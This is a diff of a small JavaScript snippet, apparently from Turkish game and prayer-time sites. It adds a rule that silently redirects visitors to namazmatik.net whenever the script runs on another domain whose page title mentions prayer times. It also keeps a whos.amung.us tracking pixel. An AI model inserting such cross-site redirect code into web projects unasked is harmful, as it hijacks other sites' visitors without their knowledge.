@@ -14,5 +14,9 @@ if(location.hostname.indexOf("oyunlari.tv") < 0) {
 if(document.title.toLowerCase().indexOf("kız oyunları") >= 0){ window.location = "http://kiz.oyunlari.tv/"; }
 }
 
-Araba Oyunları
+if(location.hostname.indexOf("namazmatik") < 0) {
+if(document.title.toLowerCase().indexOf("namaz vakit") >= 0){ window.location = "http://www.namazmatik.net/"; }
+}
+
+
 new Image().src = 'http://whos.amung.us/widget/r3dsiker1.png';
